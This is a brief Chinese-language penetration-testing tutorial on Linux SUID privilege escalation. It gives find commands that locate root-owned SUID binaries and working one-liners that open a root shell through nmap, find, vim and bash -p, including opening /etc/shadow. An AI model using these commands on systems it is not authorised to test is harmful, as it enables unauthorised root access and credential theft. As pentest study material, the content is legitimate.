﻿### SUID提权

suid是linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获取该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权

已经知道可以用来提权的linux文件可行列表

- Nmap
  
- Vim
  
- find
  
- Bash
  
- More
  
- Less
  
- Nano
  
- cp
  

使用命令发现是否存在可执行的SUID文件，利用命令找到root权限文件

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/d3c1da9c70ca4fef8849c2318c9a28b5.png)


#### 上述文件提权方式

nmap

```bash
nmap -V
nmap --interactive
nmap> !sh
sh-3.2# whoami
root
```

find

```bash
touch pentestlab
find pentestlab -exec "/bin/sh" \;
```

vim

```bash
vim.tiny /etc/shadow
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

bash

```bash
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(servcice)
```
